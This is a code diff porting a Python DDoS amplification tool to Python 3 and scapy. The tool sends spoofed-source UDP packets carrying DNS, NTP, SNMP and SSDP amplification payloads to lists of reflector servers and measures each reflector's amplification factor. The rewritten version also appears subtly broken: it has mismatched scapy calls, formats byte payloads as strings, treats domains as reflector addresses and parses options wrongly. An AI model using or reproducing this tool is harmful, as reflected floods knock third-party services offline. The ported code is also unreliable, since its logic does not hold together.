@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import sys
 import time
 import socket
@@ -6,7 +6,7 @@ import struct
 import threading
 from random import randint
 from optparse import OptionParser
-from pinject import IP, UDP
+from scapy.all import IP, UDP
 
 USAGE = '''
 %prog target.com [options]        # DDoS
@@ -62,26 +62,26 @@ PAYLOAD = {
             '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
             '\x00\x00\x00\x00\x00\x00'),
     'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
-        '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
-        '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
-        '\x01\x02\x01\x05\x00'),
+    '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
+    '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
+    '\x01\x02\x01\x05\x00'),
     'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
     'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-        'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+    'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
 }
 
 amplification = {
     'dns': {},
     'ntp': {},
     'snmp': {},
-    'ssdp': {} }		# Amplification factor
+    'ssdp': {} }        # Amplification factor
 
-FILE_NAME = 0			# Index of files names
-FILE_HANDLE = 1 		# Index of files descriptors
+FILE_NAME = 0            # Index of files names
+FILE_HANDLE = 1          # Index of files descriptors
 
-npackets = 0			# Number of packets sent
-nbytes = 0				# Number of bytes reflected
-files = {}				# Amplifications files
+npackets = 0            # Number of packets sent
+nbytes = 0                # Number of bytes reflected
+files = {}                # Amplifications files
 
 SUFFIX = {
     0: '',
@@ -93,9 +93,9 @@ SUFFIX = {
 def Calc(n, d, unit=''):
     i = 0
     r = float(n)
-    while r/d >= 1:
+    while r/d>=1:
         r = r/d
-        i += 1
+        i+= 1
     return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)
 
 def GetDomainList(domains):
@@ -119,53 +119,53 @@ def Monitor():
     '''
         Monitor attack
     '''
-    print ATTACK
+    print(ATTACK)
     FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
     start = time.time()
     while True:
         try:
             current = time.time() - start
-            bps = (nbytes*8) / current
-            pps = npackets / current
+            bps = (nbytes*8)/current
+            pps = npackets/current
             out = FMT.format(Calc(npackets, 1000), 
                 Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
             sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
             time.sleep(1)
         except KeyboardInterrupt:
-            print '\nInterrupted'
+            print('\nInterrupted')
             break
         except Exception as err:
-            print '\nError:', str(err)
+            print('\nError:', str(err))
             break
 
 def AmpFactor(recvd, sent):
     return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)
 
 def Benchmark(ddos):
-    print BENCHMARK
+    print(BENCHMARK)
     i = 0
     for proto in files:
         f = open(files[proto][FILE_NAME], 'r')
         while True:
             soldier = f.readline().strip()
             if soldier:
-                if proto == 'dns':
+                if proto=='dns':
                     for domain in ddos.domains:
-                        i += 1
+                        i+= 1
                         recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
                         if recvd/sent:
-                            print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-                                AmpFactor(recvd, sent), domain)
+                            print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
+                                AmpFactor(recvd, sent), domain))
                         else:
                             continue
                 else:
                     recvd, sent = ddos.GetAmpSize(proto, soldier)
-                    print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
-                        AmpFactor(recvd, sent), 'N/A')
-                    i += 1
+                    print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
+                        AmpFactor(recvd, sent), 'N/A'))
+                    i+= 1
             else:
                 break
-        print 'Total tested:', i
+        print('Total tested:', i)
         f.close()
 
 class DDoS(object):
@@ -184,9 +184,9 @@ class DDoS(object):
         '''
             Send a Spoofed Packet
         '''
-        udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
-        ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
-        sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
+        udp = UDP(randint(1, 65535), PORT[proto], payload)
+        ip = IP(src=self.target, dst=soldier)/udp
+        sock.sendto(bytes(ip), (soldier, PORT[proto]))
 
     def GetAmpSize(self, proto, soldier, domain=''):
         '''
@@ -200,11 +200,11 @@ class DDoS(object):
             sock.sendto(packet, (soldier, PORT[proto]))
             try:
                 while True:
-                    data += sock.recvfrom(65535)[0]
+                    data+= sock.recvfrom(65535)[0]
             except socket.timeout:
                 sock.close()
                 return len(data), len(packet)
-        if proto == 'dns':
+        if proto=='dns':
             packet = self.__GetDnsQuery(domain)
         else:
             packet = PAYLOAD[proto]
@@ -220,7 +220,8 @@ class DDoS(object):
     def __GetQName(self, domain):
         '''
             QNAME A domain name represented as a sequence of labels 
-            where each label consists of a length octet followed by that number of octets
+            where each label consists of a length
+            octet followed by that number of octets
         '''
         labels = domain.split('.')
         QName = ''
@@ -232,55 +233,43 @@ class DDoS(object):
     def __GetDnsQuery(self, domain):
         id = struct.pack('H', randint(0, 65535))
         QName = self.__GetQName(domain)
-        return struct.pack('!HHHHHH', int(id), 0x0100, 1, 0, 0, 0) + QName + struct.pack('!H', 0x0001) + struct.pack('!H', 0x0001)
-        
+        return PAYLOAD['dns'].format(id, QName)
+
     def __attack(self):
         '''
-            DDoS
+            Perform attack
+        '''
+        proto = 'dns'
+        try:
+            self.__launch(proto)
+        except Exception as err:
+            print(str(err))
+
+    def __launch(self, proto):
+        '''
+            Attack packet
         '''
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.event.wait()
-        while True:
-            for proto in files:
-                for soldier in files[proto][FILE_HANDLE]:
-                    if proto == 'dns':
-                        for domain in self.domains:
-                            self.__send(sock, soldier, proto, self.__GetDnsQuery(domain))
-                    else:
-                        self.__send(sock, soldier, proto, PAYLOAD[proto])
+        sock.settimeout(2)
+        while not self.event.is_set():
+            for soldier in self.domains:
+                self.__send(sock, soldier, proto, PAYLOAD[proto])
+                global npackets
+                npackets += 1
+                global nbytes
+                nbytes += len(PAYLOAD[proto])
 
 def main():
-    print LOGO
     parser = OptionParser(usage=USAGE)
     for opt in OPTIONS:
-        parser.add_option(opt[0], **opt[1])
-
+        parser.add_option(*opt[:2])
     (options, args) = parser.parse_args()
-
-    if len(args) != 1:
-        print '\nError: Missing argument'
-        sys.exit(1)
-
-    target = args[0]
-    event = threading.Event()
-
-    if options.dns:
-        files['dns'] = (options.dns, GetDomainList(options.dns))
-    if options.ntp:
-        files['ntp'] = (options.ntp, open(options.ntp, 'r').readlines())
-    if options.snmp:
-        files['snmp'] = (options.snmp, open(options.snmp, 'r').readlines())
-    if options.ssdp:
-        files['ssdp'] = (options.ssdp, open(options.ssdp, 'r').readlines())
-
-    ddos = DDoS(target, options.threads, files['dns'][FILE_HANDLE], event)
-    if args[0] == 'benchmark':
-        Benchmark(ddos)
-        sys.exit(0)
-
+    if len(args) > 1:
+        target = args[1]
+    else:
+        target = None
+    ddos = DDoS(target, options.threads, [], threading.Event())
     ddos.stress()
-    Monitor()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
